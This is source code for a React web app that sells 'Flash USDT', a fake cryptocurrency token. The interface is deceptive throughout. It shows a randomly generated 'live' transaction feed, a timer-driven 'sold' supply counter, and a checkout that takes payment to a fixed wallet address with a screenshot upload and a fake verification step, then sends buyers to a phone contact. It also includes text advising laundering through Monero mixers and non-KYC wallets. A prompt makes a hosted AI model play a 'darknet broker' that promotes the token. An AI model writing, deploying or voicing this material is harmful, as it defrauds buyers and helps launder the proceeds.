
import React, { useState, useEffect, useRef } from 'react';
import { createRoot } from 'react-dom/client';
import { 
  ShieldAlert, 
  Cpu, 
  Zap, 
  Lock, 
  Globe, 
  MessageSquare, 
  Send, 
  ChevronRight,
  Wifi,
  Skull,
  Activity,
  Hash,
  Database,
  Terminal as ConsoleIcon,
  DollarSign,
  BookOpen,
  RefreshCw,
  Layers,
  Info,
  Menu,
  User,
  Signal,
  ArrowDownCircle,
  ArrowUpCircle,
  TrendingUp,
  X,
  CreditCard,
  ShieldCheck,
  History,
  Clock,
  Upload,
  CheckCircle2,
  AlertCircle,
  PhoneCall,
  List,
  Wallet,
  Network
} from 'lucide-react';
import { GoogleGenAI } from "@google/genai";

const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });

const RANDOM_NAMES = [
  'CryptoKing_99', 'Anon_X', 'ShadowWalker', 'Bit_Mage', 'Satoshi_Ghost', 
  'Dex_Master', 'Void_Runner', 'Loom_Protocol', 'Hask_Dev', 'Cyber_Papi',
  'Ghost_In_The_Machine', 'Alpha_Block', 'Nodes_Of_Steel', 'Eth_Killer',
  'Binance_Whale_01', 'Private_Key_X', 'ColdWallet_44', 'Meta_God',
  'Trx_Sniper', 'Mempool_Drifter', 'Hash_Rat', 'Cipher_Punk', 'Web3_Wanderer'
];

const TRANSACTION_TYPES = ['BUY', 'WITHDRAW', 'DEPOSIT', 'INJECT'];
const STATUSES = ['Confirmed', 'Processing', 'Broadcasted'];

const PACKAGES = [
  { id: 1, name: "STARTER PAYLOAD", amount: "800", basePrice: 50, desc: "Basic injection for testing network voids." },
  { id: 2, name: "ADVANCED INJECTION", amount: "2,500", basePrice: 100, desc: "Professional stealth for verified assets." },
  { id: 3, name: "ELITE BREACH", amount: "7,000", basePrice: 200, desc: "High-volume payload for institutional shadowing." },
  { id: 4, name: "OVERLORD PROTOCOL", amount: "10,000", basePrice: 500, desc: "Maximum liquidity mirroring with zero trace." },
];

const NETWORKS = ['TRC20', 'ERC20', 'BEP20', 'SOLANA', 'BITCOIN', 'POLYGON'];

const TabButton = ({ active, onClick, icon, label }: { active: boolean, onClick: () => void, icon: React.ReactNode, label: string }) => (
  <button 
    onClick={onClick}
    className={`flex flex-col items-center justify-center gap-1 px-2 py-2 transition-all flex-1 ${active ? 'text-[#00FF41]' : 'text-[#00FF41]/30'}`}
  >
    {React.cloneElement(icon as React.ReactElement, { size: 22, className: active ? 'animate-pulse' : '' })}
    <span className="text-[9px] uppercase font-bold tracking-tighter">{label}</span>
  </button>
);

const App: React.FC = () => {
  const [activeTab, setActiveTab] = useState<'dash' | 'store' | 'protocol' | 'live' | 'chat'>('dash');
  const [liveTxHistory, setLiveTxHistory] = useState<any[]>([]);
  
  // Purchase Flow States
  const [purchaseStep, setPurchaseStep] = useState<number | null>(null);
  const [lockedPrice, setLockedPrice] = useState<string>("");
  const [checkoutStage, setCheckoutStage] = useState<'address' | 'upload' | 'processing' | 'receive_address' | 'final'>('address');
  const [processingTimer, setProcessingTimer] = useState(30);
  const [screenshot, setScreenshot] = useState<File | null>(null);
  const [targetNetwork, setTargetNetwork] = useState('TRC20');
  const [targetAddress, setTargetAddress] = useState('');

  // User History State
  const [userHistory, setUserHistory] = useState<any[]>([]);
  const [historyOpen, setHistoryOpen] = useState(false);

  // Available Supply Logic
  const [availableFlash, setAvailableFlash] = useState(500000000);
  const [lastSupplyChange, setLastSupplyChange] = useState(0);
  const [isSupplyPulsing, setIsSupplyPulsing] = useState(false);

  const [chatInput, setChatInput] = useState("");
  const [chatHistory, setChatHistory] = useState<{role: 'user' | 'model', text: string}[]>([
    {role: 'model', text: "Greetings. I am The Broker. The network is currently stable. How can I facilitate your protocol expansion?"}
  ]);
  const [isTyping, setIsTyping] = useState(false);
  const [sidebarOpen, setSidebarOpen] = useState(false);

  // Dynamic Pricing State logic: Base price +/- 15%
  const calculateFluctuatedPrice = (base: number) => {
    const fluctuation = (Math.random() * 0.3) - 0.15; // Range: -0.15 to +0.15
    const finalPrice = base * (1 + fluctuation);
    return `$${finalPrice.toFixed(2)}`;
  };

  const [planPrices, setPlanPrices] = useState<Record<number, string>>(() => {
    const initial: Record<number, string> = {};
    PACKAGES.forEach(pkg => {
      initial[pkg.id] = `$${pkg.basePrice.toFixed(2)}`;
    });
    return initial;
  });

  const [nextUpdateTimer, setNextUpdateTimer] = useState(60);

  const chatEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const initialData = Array.from({ length: 10 }).map((_, i) => generateRandomTx());
    setLiveTxHistory(initialData);
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      setLiveTxHistory(prev => [generateRandomTx(), ...prev.slice(0, 30)]);
    }, 2500); 
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const priceInterval = setInterval(() => {
      setNextUpdateTimer((prev) => {
        if (prev <= 1) {
          const updatedPrices: Record<number, string> = {};
          PACKAGES.forEach(pkg => {
            updatedPrices[pkg.id] = calculateFluctuatedPrice(pkg.basePrice);
          });
          setPlanPrices(updatedPrices);
          return 60;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(priceInterval);
  }, []);

  // Supply Countdown Logic: 30 days total, discrete "sales" of at least 800
  useEffect(() => {
    const INITIAL_SUPPLY = 500000000;
    const DURATION_SECONDS = 30 * 24 * 60 * 60; 
    
    let launchTime = localStorage.getItem('flash_launch_time');
    if (!launchTime) {
      launchTime = Date.now().toString();
      localStorage.setItem('flash_launch_time', launchTime);
    }
    const startTime = parseInt(launchTime);

    const runSupplyUpdate = () => {
      const now = Date.now();
      const elapsed = (now - startTime) / 1000;
      
      // Calculate where we SHOULD be linearly
      const linearRemaining = Math.max(0, INITIAL_SUPPLY - (elapsed * (INITIAL_SUPPLY / DURATION_SECONDS)));
      
      setAvailableFlash(current => {
        // If current is significantly higher than linear, we need to "sell" a chunk
        if (current > linearRemaining) {
          // Minimum reduction is 800 per user request
          // We pick a random "sale" amount between 800 and 12,000 to keep it interesting
          const chunk = 800 + Math.floor(Math.random() * 11200);
          const next = Math.max(linearRemaining, current - chunk);
          
          if (next !== current) {
            setLastSupplyChange(current - next);
            setIsSupplyPulsing(true);
            setTimeout(() => setIsSupplyPulsing(false), 1000);
          }
          return next;
        }
        return current;
      });

      // Randomize next update to feel organic (between 3 and 7 seconds)
      const nextTimeout = 3000 + Math.random() * 4000;
      setTimeout(runSupplyUpdate, nextTimeout);
    };

    // Initial sync
    const now = Date.now();
    const elapsed = (now - startTime) / 1000;
    const syncRemaining = Math.max(0, INITIAL_SUPPLY - (elapsed * (INITIAL_SUPPLY / DURATION_SECONDS)));
    setAvailableFlash(syncRemaining);

    runSupplyUpdate();
  }, []);

  useEffect(() => {
    let interval: any;
    if (checkoutStage === 'processing') {
      interval = setInterval(() => {
        setProcessingTimer((prev) => {
          if (prev <= 1) {
            setCheckoutStage('receive_address');
            clearInterval(interval);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [checkoutStage]);

  const completeOrder = () => {
    if (!targetAddress.trim()) return;
    const pkg = PACKAGES.find(p => p.id === purchaseStep);
    const newTx = {
      id: Math.random().toString(36).substr(2, 9).toUpperCase(),
      pkgName: pkg?.name,
      amount: pkg?.amount,
      price: lockedPrice,
      status: 'PENDING',
      network: targetNetwork,
      target: targetAddress,
      time: new Date().toLocaleString()
    };
    setUserHistory(prevH => [newTx, ...prevH]);
    setCheckoutStage('final');
  };

  useEffect(() => { chatEndRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [chatHistory]);

  const generateRandomTx = () => {
    const name = RANDOM_NAMES[Math.floor(Math.random() * RANDOM_NAMES.length)];
    const type = TRANSACTION_TYPES[Math.floor(Math.random() * TRANSACTION_TYPES.length)];
    const amount = (Math.floor(Math.random() * 200) + 1) * 500;
    const status = STATUSES[Math.floor(Math.random() * STATUSES.length)];
    const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const id = Math.random().toString(36).substr(2, 9).toUpperCase();
    return { id, name, type, amount, status, time };
  };

  const startPurchase = (id: number) => {
    setPurchaseStep(id);
    setLockedPrice(planPrices[id]);
    setCheckoutStage('address');
    setProcessingTimer(30);
    setScreenshot(null);
    setTargetAddress('');
    setActiveTab('store');
  };

  const handleSendMessage = async () => {
    if (!chatInput.trim() || isTyping) return;
    const msg = chatInput;
    setChatInput("");
    setChatHistory(p => [...p, {role: 'user', text: msg}]);
    setIsTyping(true);
    try {
      const response = await ai.models.generateContent({
        model: 'gemini-3-flash-preview',
        contents: `You are 'The Broker', a darknet AI. Explain Flash USDT as digital ghosts using smart contract voids. User: ${msg}`,
        config: { systemInstruction: "Enigmatic expert persona. Use technical slang and Hinglish mix where appropriate." }
      });
      setChatHistory(p => [...p, {role: 'model', text: response.text || "Encryption glitch."}]);
    } catch {
      setChatHistory(p => [...p, {role: 'model', text: "Signal lost. Reconnecting TOR..."}]);
    } finally { setIsTyping(false); }
  };

  return (
    <div className="h-screen bg-black text-[#00FF41] font-mono flex flex-col overflow-hidden relative selection:bg-[#00FF41] selection:text-black">
      <div className="fixed inset-0 pointer-events-none opacity-5 bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')] z-0" />
      
      {sidebarOpen && (
        <div className="fixed inset-0 z-[60] bg-black/60 backdrop-blur-sm">
          <div className="w-64 h-full bg-black border-r border-[#00FF41]/20 p-6 animate-in slide-in-from-left duration-300">
            <div className="flex justify-between items-center mb-8">
              <span className="text-xs font-black uppercase tracking-widest">Options</span>
              <button onClick={() => setSidebarOpen(false)}><X size={20} /></button>
            </div>
            <div className="space-y-6">
              <div className="space-y-2">
                <div className="text-[10px] opacity-30 uppercase">Protocol</div>
                <button className="flex items-center gap-3 text-sm hover:text-white"><ShieldCheck size={16} /> Status Check</button>
                <button className="flex items-center gap-3 text-sm hover:text-white"><Database size={16} /> Node Map</button>
              </div>
              <div className="space-y-2">
                <div className="text-[10px] opacity-30 uppercase">Account</div>
                <button className="flex items-center gap-3 text-sm hover:text-white"><User size={16} /> User Profile</button>
                <button className="flex items-center gap-3 text-sm hover:text-white"><CreditCard size={16} /> Billing Info</button>
              </div>
              <div className="pt-8 border-t border-white/5 text-[9px] opacity-40 leading-relaxed">
                Version 5.2.4-STABLE<br/>
                All connections are routed through Layer-7 Tor bridges.
              </div>
            </div>
          </div>
        </div>
      )}

      {historyOpen && (
        <div className="fixed inset-0 z-[70] bg-black/80 backdrop-blur-md flex items-center justify-center p-4">
          <div className="w-full max-w-md bg-black border border-[#00FF41] rounded-2xl overflow-hidden shadow-[0_0_50px_rgba(0,255,65,0.2)] flex flex-col max-h-[80vh]">
             <div className="p-4 border-b border-[#00FF41]/20 flex justify-between items-center bg-[#00FF41]/5">
                <div className="flex items-center gap-2">
                   <History size={18} />
                   <h2 className="text-sm font-black uppercase tracking-widest">Order History</h2>
                </div>
                <button onClick={() => setHistoryOpen(false)} className="p-1 hover:bg-white/10 rounded">
                   <X size={20} />
                </button>
             </div>
             <div className="flex-1 overflow-y-auto p-4 space-y-3">
                {userHistory.length === 0 ? (
                  <div className="py-20 text-center opacity-30">
                     <AlertCircle size={40} className="mx-auto mb-2" />
                     <p className="text-[10px] uppercase">No logs found</p>
                  </div>
                ) : (
                  userHistory.map((tx) => (
                    <div key={tx.id} className="bg-white/5 border border-white/10 p-3 rounded-lg space-y-2">
                       <div className="flex justify-between items-start">
                          <div>
                             <div className="text-[10px] font-black text-white uppercase">{tx.pkgName}</div>
                             <div className="text-[8px] opacity-40 uppercase">{tx.id}</div>
                          </div>
                          <div className="px-2 py-0.5 bg-orange-500/20 text-orange-500 rounded text-[8px] font-black border border-orange-500/30">
                             {tx.status}
                          </div>
                       </div>
                       <div className="text-[9px] text-[#00FF41]/60 font-mono truncate">{tx.target}</div>
                       <div className="flex justify-between items-end border-t border-white/5 pt-2">
                          <div className="text-[8px] opacity-40 uppercase">{tx.time}</div>
                          <div className="text-xs font-black text-[#00FF41]">{tx.amount} FLASH</div>
                       </div>
                    </div>
                  ))
                )}
             </div>
             <div className="p-4 bg-black border-t border-white/5 text-[8px] opacity-30 uppercase tracking-tighter text-center">
                History is local-only and encrypted.
             </div>
          </div>
        </div>
      )}

      <header className="z-50 shrink-0 bg-black/80 border-b border-[#00FF41]/20 p-3 flex justify-between items-center backdrop-blur-xl sticky top-0">
        <div className="flex items-center gap-3">
          <button onClick={() => setSidebarOpen(true)} className="p-1 hover:bg-[#00FF41]/10 rounded transition-colors">
            <Menu size={20} />
          </button>
          <div className="flex flex-col">
            <h1 className="text-sm font-black tracking-tighter leading-none italic">PROTO<span className="text-white">FLASH</span></h1>
            <span className="text-[7px] opacity-40 tracking-widest uppercase">Secured by Layer-7 Tunneling</span>
          </div>
        </div>
        
        <div className="flex items-center gap-3">
          <button 
            onClick={() => setHistoryOpen(true)} 
            className="p-2 hover:bg-[#00FF41]/10 rounded-full transition-colors relative"
          >
             <History size={18} />
             {userHistory.length > 0 && (
               <div className="absolute top-1 right-1 w-2 h-2 bg-[#00FF41] rounded-full animate-ping" />
             )}
          </button>
          
          <div className="flex items-center gap-2 border-l border-white/10 pl-3">
            <div className="flex flex-col items-end">
              <span className="text-[9px] font-bold text-white uppercase tracking-tighter">GHOST_USER</span>
              <span className="text-[8px] opacity-40">Lv.4 Access</span>
            </div>
            <div className="w-8 h-8 rounded-full border border-[#00FF41]/40 bg-[#00FF41]/10 flex items-center justify-center">
              <User size={16} />
            </div>
          </div>
        </div>
      </header>

      <main className="flex-1 overflow-y-auto z-20 pb-20 scroll-smooth">
        {activeTab === 'dash' && (
          <div className="animate-in fade-in duration-500">
            <div className="bg-[#00FF41]/5 border-b border-[#00FF41]/10 py-2 overflow-hidden whitespace-nowrap">
              <div className="flex gap-8 animate-[ticker_40s_linear_infinite] px-4">
                {liveTxHistory.slice(0, 10).map(tx => (
                  <div key={tx.id} className="flex items-center gap-2 text-[10px] uppercase font-bold">
                    <TrendingUp size={12} className={tx.type === 'BUY' || tx.type === 'INJECT' ? 'text-blue-400' : 'text-red-400'} />
                    <span className="opacity-50">{tx.time}</span>
                    <span className="text-white">{tx.name}</span>
                    <span className={tx.type === 'BUY' ? 'text-blue-400' : 'text-red-400'}>{tx.type}</span>
                    <span className="text-[#00FF41]">{tx.amount.toLocaleString()} FLASH</span>
                  </div>
                ))}
              </div>
            </div>

            <div className="p-4 md:p-8 space-y-8 max-w-6xl mx-auto">
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                <div className="bg-white/5 border border-white/10 p-4 rounded-xl">
                  <div className="text-[9px] opacity-40 uppercase mb-1">Network Vol (24h)</div>
                  <div className="text-lg font-black text-white">$4,281,902</div>
                </div>
                <div className="bg-white/5 border border-white/10 p-4 rounded-xl">
                  <div className="text-[9px] opacity-40 uppercase mb-1">Injection Load</div>
                  <div className="text-lg font-black text-[#00FF41]">82.4%</div>
                </div>
                <div className="bg-white/5 border border-white/10 p-4 rounded-xl relative overflow-hidden group">
                  <div className={`absolute inset-0 bg-red-500/10 transition-opacity duration-300 ${isSupplyPulsing ? 'opacity-100' : 'opacity-0'}`} />
                  <div className="text-[9px] opacity-40 uppercase mb-1">Available Flash USDT</div>
                  <div className={`text-lg font-black transition-all duration-300 ${isSupplyPulsing ? 'text-white scale-105' : 'text-blue-400'}`}>
                    {Math.floor(availableFlash).toLocaleString()}
                  </div>
                  {isSupplyPulsing && (
                    <div className="absolute top-1 right-2 text-[8px] font-bold text-red-500 animate-bounce">
                      -{lastSupplyChange.toLocaleString()} SOLD
                    </div>
                  )}
                </div>
                <div className="bg-white/5 border border-white/10 p-4 rounded-xl">
                  <div className="text-[9px] opacity-40 uppercase mb-1">Active Peers</div>
                  <div className="text-lg font-black text-white">422</div>
                </div>
              </div>

              <div className="space-y-4">
                <div className="flex justify-between items-end">
                  <h2 className="text-xl font-black uppercase italic tracking-tighter">Available Injections</h2>
                  <span className="text-[9px] opacity-40 animate-pulse">Live Update: {new Date().toLocaleTimeString()}</span>
                </div>
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
                  {PACKAGES.map(p => (
                    <div key={p.id} className="bg-black/60 border border-[#00FF41]/20 p-5 rounded-2xl hover:border-[#00FF41] transition-all group relative overflow-hidden flex flex-col">
                      <div className="absolute top-2 right-2 flex items-center gap-1.5 text-[9px] font-bold text-[#00FF41]/60">
                        <Clock size={10} />
                        <span>RE-SYNC: {nextUpdateTimer}s</span>
                      </div>

                      <div className="flex justify-between mb-4">
                        <div className="p-2 bg-[#00FF41]/10 rounded-lg text-[#00FF41]"><Zap size={18} /></div>
                      </div>
                      <h3 className="text-xs font-black uppercase text-white mb-1">{p.name}</h3>
                      <p className="text-[9px] opacity-40 leading-tight mb-4 flex-1">{p.desc}</p>
                      <div className="flex justify-between items-center mb-6">
                        <div className="text-lg font-black text-white">{p.amount} <span className="text-[9px] text-[#00FF41]">FLASH</span></div>
                        <div className="text-right">
                          <div className="text-xs font-bold text-[#00FF41]">{planPrices[p.id]}</div>
                          <div className="text-[7px] opacity-40">Live Price</div>
                        </div>
                      </div>
                      <button onClick={() => startPurchase(p.id)} className="w-full py-3 bg-[#00FF41]/5 border border-[#00FF41]/30 text-[#00FF41] font-bold text-[10px] uppercase rounded-xl group-hover:bg-[#00FF41] group-hover:text-black transition-all">
                        Initiate Buy
                      </button>
                    </div>
                  ))}
                </div>
              </div>

              <div className="bg-black/80 border border-white/10 p-6 rounded-2xl relative overflow-hidden">
                <Skull className="absolute -bottom-6 -right-6 opacity-5 rotate-12" size={150} />
                <div className="flex items-center gap-3 mb-4 text-white">
                  <BookOpen size={20} className="text-[#00FF41]" />
                  <h3 className="font-black uppercase tracking-widest text-sm">Protocol Intelligence</h3>
                </div>
                <div className="space-y-6 text-[12px] leading-relaxed opacity-70">
                  <p>
                    <strong className="text-white uppercase block mb-1">How Flash USDT is Created?</strong>
                    Hamari protocol blockchian ke Mempool (Temporary storage) mein bugs find karti hai. Hum ek specialized "Ghost Smart Contract" deploy karte hain jo legitimate USDT contract ko shadow karta hai. Isse aapke wallet mein temporary balance show hota hai jo real blockchain explorer par bhi verify hota hai for 60-90 days.
                  </p>
                  <p>
                    <strong className="text-white uppercase block mb-1">How to Withdraw?</strong>
                    Direct exchange par withdraw karna dangerous ho sakta hai. Hum recommend karte hain hamara Layer-7 Bridge use karna. Pehle Flash assets ko privacy coins (like Monero) mein convert karein hamare integrated mixer ke through, phir decentralized DEX (P2P) par sell karein for real cash.
                  </p>
                  <div className="flex items-center gap-2 p-3 bg-red-500/10 border border-red-500/30 rounded text-red-500 font-bold text-[10px] uppercase">
                    <ShieldAlert size={14} /> Only use non-KYC wallets for initial transfers.
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'live' && (
          <div className="animate-in fade-in duration-500 p-4 md:p-8 max-w-4xl mx-auto h-full flex flex-col">
            <div className="mb-6 flex justify-between items-end border-b border-[#00FF41]/20 pb-4">
              <div>
                <h2 className="text-2xl font-black uppercase tracking-tighter">Live Activity</h2>
                <p className="text-[10px] opacity-40 uppercase tracking-widest">Global Network Transaction Feed</p>
              </div>
              <div className="text-right">
                <div className="text-xs font-bold text-[#00FF41] flex items-center gap-2 justify-end">
                  <div className="w-2 h-2 bg-red-600 rounded-full animate-pulse" /> LIVE SYNCING
                </div>
                <div className="text-[9px] opacity-40">NODE: HK-MAINNET</div>
              </div>
            </div>

            <div className="flex-1 overflow-y-auto space-y-3 pr-2 scrollbar-hide">
              {liveTxHistory.map((tx, i) => (
                <div key={tx.id} className="bg-white/5 border border-white/10 p-4 rounded-xl flex items-center justify-between animate-in slide-in-from-top-4 duration-300">
                   <div className="flex items-center gap-4">
                      <div className={`p-2 rounded-lg ${tx.type === 'BUY' ? 'bg-blue-500/10 text-blue-400' : 'bg-red-500/10 text-red-400'}`}>
                         {tx.type === 'BUY' ? <ArrowDownCircle size={20}/> : <ArrowUpCircle size={20}/>}
                      </div>
                      <div>
                         <div className="text-xs font-black text-white">{tx.name}</div>
                         <div className="text-[9px] opacity-40 uppercase tracking-tighter">ID: {tx.id} • {tx.time}</div>
                      </div>
                   </div>
                   <div className="text-right">
                      <div className="text-sm font-black text-[#00FF41]">{tx.amount.toLocaleString()} <span className="text-[8px] opacity-60">USDT</span></div>
                      <div className="flex items-center gap-1 justify-end">
                         <div className="w-1 h-1 bg-green-500 rounded-full" />
                         <span className="text-[8px] uppercase opacity-40">{tx.status}</span>
                      </div>
                   </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {activeTab === 'store' && (
           <div className="p-4 md:p-8 max-w-xl mx-auto animate-in zoom-in-95 duration-500">
             {!purchaseStep ? (
               <div className="text-center py-20 space-y-4">
                 <Hash className="mx-auto text-[#00FF41]/20" size={48} />
                 <h2 className="text-xl font-bold">Select a package from Mainframe</h2>
                 <button onClick={() => setActiveTab('dash')} className="px-6 py-2 border border-[#00FF41]/40 text-xs">Back to Home</button>
               </div>
             ) : (
               <div className="bg-black border border-[#00FF41]/30 p-8 rounded-2xl shadow-2xl space-y-8 relative overflow-hidden">
                 <div className="absolute top-0 left-0 w-full h-1 bg-[#00FF41] animate-pulse" />
                 
                 {checkoutStage === 'address' && (
                   <>
                     <div className="flex justify-between items-start">
                       <h2 className="text-xl font-black uppercase italic">Payment Confirmation</h2>
                       <button onClick={() => setPurchaseStep(null)} className="text-[10px] opacity-30 hover:opacity-100 uppercase underline">Discard</button>
                     </div>
                     
                     <div className="space-y-4">
                        <div className="flex justify-center p-2 bg-white rounded-xl mx-auto w-fit">
                          <img 
                            src="https://i.ibb.co/ZpYD57gB/IMG-2563.jpg" 
                            alt="Deposit QR" 
                            className="w-32 h-32 object-contain"
                            onError={(e) => {
                              (e.target as HTMLImageElement).src = "https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=TA1QJtR8UqnbG7b3fUAg2jAf5sobNUCGSL";
                            }}
                          />
                        </div>

                        <div className="bg-[#00FF41]/5 border border-[#00FF41]/10 p-4 rounded-xl">
                          <div className="text-[9px] opacity-40 uppercase mb-2">TRC20 Deposit Address</div>
                          <div className="text-[10px] font-mono break-all text-white select-all bg-black p-3 rounded border border-white/5">TA1QJtR8UqnbG7b3fUAg2jAf5sobNUCGSL</div>
                          <div className="mt-2 text-[8px] opacity-30 text-center">Tap to copy • Non-custodial Tunnel</div>
                        </div>
                        
                        <div className="grid grid-cols-2 gap-4">
                          <div className="bg-white/5 p-3 rounded-lg border border-white/5 text-center">
                            <div className="text-[8px] opacity-40 mb-1 uppercase">Amount Due</div>
                            <div className="text-white font-black">{lockedPrice}</div>
                          </div>
                          <div className="bg-white/5 p-3 rounded-lg border border-white/5 text-center">
                            <div className="text-[8px] opacity-40 mb-1 uppercase">Package</div>
                            <div className="text-white font-black">{PACKAGES.find(x => x.id === purchaseStep)?.name.split(' ')[0]}</div>
                          </div>
                        </div>
                     </div>

                     <button 
                       onClick={() => setCheckoutStage('upload')}
                       className="w-full py-4 bg-[#00FF41] text-black font-black uppercase tracking-widest rounded-xl hover:bg-white transition-colors"
                     >
                       Confirm Payment
                     </button>
                   </>
                 )}

                 {checkoutStage === 'upload' && (
                   <div className="space-y-6 animate-in fade-in zoom-in-95 duration-300">
                     <div className="text-center">
                       <h2 className="text-xl font-black uppercase italic">Proof of Payment</h2>
                       <p className="text-[10px] opacity-40 uppercase mt-1">Upload a screenshot of your transaction</p>
                     </div>

                     <div className="border-2 border-dashed border-[#00FF41]/20 rounded-2xl p-8 flex flex-col items-center justify-center gap-4 bg-[#00FF41]/5 relative">
                       <input 
                         type="file" 
                         accept="image/*"
                         onChange={(e) => setScreenshot(e.target.files?.[0] || null)}
                         className="absolute inset-0 opacity-0 cursor-pointer"
                       />
                       <div className="w-16 h-16 rounded-full bg-[#00FF41]/10 flex items-center justify-center text-[#00FF41]">
                         <Upload size={32} />
                       </div>
                       <div className="text-center">
                         <span className="text-xs font-bold text-white">
                           {screenshot ? screenshot.name : "Tap to browse screenshots"}
                         </span>
                         <p className="text-[9px] opacity-40 mt-1 uppercase">JPG, PNG or GIF (Max 5MB)</p>
                       </div>
                     </div>

                     <button 
                       disabled={!screenshot}
                       onClick={() => setCheckoutStage('processing')}
                       className="w-full py-4 bg-[#00FF41] text-black font-black uppercase tracking-widest rounded-xl disabled:opacity-30 disabled:cursor-not-allowed"
                     >
                       Submit Verification
                     </button>
                   </div>
                 )}

                 {checkoutStage === 'processing' && (
                   <div className="py-8 space-y-8 animate-in fade-in duration-300">
                      <div className="flex flex-col items-center gap-4">
                         <div className="w-20 h-20 rounded-full border-4 border-[#00FF41]/20 border-t-[#00FF41] animate-spin flex items-center justify-center">
                            <span className="text-sm font-black text-[#00FF41]">{processingTimer}s</span>
                         </div>
                         <div className="text-center">
                            <h2 className="text-lg font-black uppercase text-white">Verifying Transaction</h2>
                            <p className="text-[10px] opacity-40 uppercase tracking-widest mt-1">Checking blockchain mempool status...</p>
                         </div>
                      </div>

                      <div className="space-y-2">
                        <div className="h-1 bg-white/5 rounded-full overflow-hidden">
                          <div 
                            className="h-full bg-[#00FF41] transition-all duration-1000 ease-linear"
                            style={{ width: `${((30 - processingTimer) / 30) * 100}%` }}
                          />
                        </div>
                        <div className="flex justify-between text-[8px] opacity-40 uppercase font-bold">
                           <span>Broadcasting</span>
                           <span>Syncing: {(100 - (processingTimer/30*100)).toFixed(0)}%</span>
                        </div>
                      </div>

                      <div className="bg-black/40 p-3 rounded border border-white/5 text-[9px] font-mono text-[#00FF41]/60">
                         [LOG] Found potential match in pool HK-01...<br/>
                         [LOG] Validating signature hashes...<br/>
                         [LOG] Layer-7 tunneling stable...
                      </div>
                   </div>
                 )}

                 {checkoutStage === 'receive_address' && (
                    <div className="space-y-6 animate-in fade-in zoom-in-95 duration-500">
                       <div className="text-center">
                          <h2 className="text-xl font-black uppercase italic">Target Destination</h2>
                          <p className="text-[10px] opacity-40 uppercase mt-1">Configure your receiving wallet</p>
                       </div>

                       <div className="space-y-4">
                          <div className="space-y-2">
                             <label className="text-[9px] opacity-40 uppercase font-bold flex items-center gap-2">
                                <Network size={12} /> Select Crypto Network
                             </label>
                             <div className="grid grid-cols-3 gap-2">
                                {NETWORKS.map(net => (
                                   <button 
                                      key={net}
                                      onClick={() => setTargetNetwork(net)}
                                      className={`py-2 px-1 text-[9px] font-black border rounded-lg transition-all ${targetNetwork === net ? 'bg-[#00FF41] text-black border-[#00FF41]' : 'bg-white/5 text-[#00FF41] border-[#00FF41]/20 hover:border-[#00FF41]/60'}`}
                                   >
                                      {net}
                                   </button>
                                ))}
                             </div>
                          </div>

                          <div className="space-y-2">
                             <label className="text-[9px] opacity-40 uppercase font-bold flex items-center gap-2">
                                <Wallet size={12} /> Receiving Wallet Address
                             </label>
                             <input 
                                type="text"
                                value={targetAddress}
                                onChange={(e) => setTargetAddress(e.target.value)}
                                placeholder="Paste target address here..."
                                className="w-full bg-white/5 border border-[#00FF41]/30 p-4 rounded-xl text-white font-mono text-xs focus:outline-none focus:border-[#00FF41]"
                             />
                             <p className="text-[8px] opacity-30 text-center uppercase italic">Double check the address for successful injection.</p>
                          </div>
                       </div>

                       <button 
                          disabled={!targetAddress.trim()}
                          onClick={completeOrder}
                          className="w-full py-4 bg-[#00FF41] text-black font-black uppercase tracking-widest rounded-xl disabled:opacity-30 disabled:cursor-not-allowed hover:bg-white transition-all shadow-[0_0_20px_rgba(0,255,65,0.3)]"
                       >
                          Finalize Injection
                       </button>
                    </div>
                 )}

                 {checkoutStage === 'final' && (
                   <div className="py-4 space-y-6 text-center animate-in zoom-in-95 duration-500">
                      <div className="flex justify-center">
                         <div className="w-20 h-20 rounded-full bg-orange-500/10 border-2 border-orange-500 flex items-center justify-center text-orange-500">
                            <AlertCircle size={40} className="animate-pulse" />
                         </div>
                      </div>

                      <div className="space-y-2">
                         <h2 className="text-2xl font-black uppercase tracking-tighter text-white">Order Pending</h2>
                         <p className="text-[11px] leading-relaxed text-[#00FF41]/80 px-4">
                           Your order is now pending. Our system is currently verifying your payment. 
                           Please contact our agent now for further details and to confirm your delivery.
                         </p>
                      </div>

                      <div className="bg-[#00FF41]/5 border border-[#00FF41]/20 p-6 rounded-2xl space-y-4">
                         <div className="flex items-center justify-center gap-3 text-white">
                            <PhoneCall size={20} className="text-[#00FF41]" />
                            <span className="text-lg font-black tracking-widest">+971 58 225 8710</span>
                         </div>
                         <button 
                           onClick={() => window.open('tel:+971582258710')}
                           className="w-full py-3 bg-[#00FF41]/10 border border-[#00FF41]/40 text-[#00FF41] text-xs font-black uppercase rounded-lg hover:bg-[#00FF41] hover:text-black transition-all"
                         >
                           Contact Agent Now
                         </button>
                      </div>

                      <button 
                        onClick={() => setPurchaseStep(null)}
                        className="text-[10px] opacity-30 hover:opacity-100 uppercase underline"
                      >
                        Return to Dashboard
                      </button>
                   </div>
                 )}
               </div>
             )}
           </div>
        )}

        {activeTab === 'chat' && (
          <div className="h-full flex flex-col p-4 animate-in slide-in-from-right-10 duration-500">
             <div className="flex-1 overflow-y-auto space-y-4 p-4 border border-[#00FF41]/10 bg-black/60 rounded-xl mb-4 scrollbar-hide">
              {chatHistory.map((c, i) => (
                <div key={i} className={`flex flex-col ${c.role === 'user' ? 'items-end' : 'items-start'}`}>
                  <div className={`max-w-[85%] p-3 text-[12px] rounded-2xl ${c.role === 'user' ? 'bg-white/10 text-white rounded-br-none' : 'bg-[#00FF41]/10 text-[#00FF41] border border-[#00FF41]/20 rounded-bl-none'}`}>
                    {c.text}
                  </div>
                </div>
              ))}
              {isTyping && <div className="text-[#00FF41]/40 animate-pulse text-[10px] uppercase">Broker is decrypting query...</div>}
              <div ref={chatEndRef} />
            </div>
